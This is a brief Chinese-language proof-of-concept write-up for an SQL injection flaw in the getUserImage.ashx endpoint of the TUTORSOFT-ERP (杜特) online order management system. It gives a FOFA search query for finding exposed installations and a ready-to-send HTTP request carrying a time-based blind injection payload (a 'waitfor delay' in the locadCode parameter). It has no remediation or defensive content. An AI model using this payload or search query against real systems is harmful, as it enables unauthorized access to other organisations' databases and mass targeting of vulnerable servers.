# 杜特网上订单管理系统getUserImage.ashx存在SQL注入漏洞

杜特网上订单管理系统getUserImage.ashx存在SQL注入漏洞

## fofa

```javascript
app="TUTORSOFT-ERP"
```

## poc

```javascript
GET /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:5 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241219151440983](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191514043.png)
